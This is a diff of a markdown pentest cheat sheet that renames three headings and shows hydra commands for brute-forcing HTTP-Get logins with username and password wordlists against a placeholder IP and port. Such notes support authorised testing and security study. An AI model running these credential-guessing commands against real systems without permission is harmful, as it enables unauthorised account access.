@@ -15,17 +15,17 @@ Help
 hydra -h
 ```
 
-Bruteforce Web Login (username:password)
+Bruteforce HTTP-Get (username:password)
 ```bash
 hydra -C wordlist.txt <ip> -s <port> http-get /
 ```
 
-Bruteforce Username
+Bruteforce Username HTTP-Get
 ```bash
 hydra -L user.list -p password -f <ip> -s <port> http-get /
 ```
 
-Bruteforce Password
+Bruteforce Password HTTP-Get
 ```bash
 hydra -l username -P password.list -f <ip> -s <port> http-get /
 ```
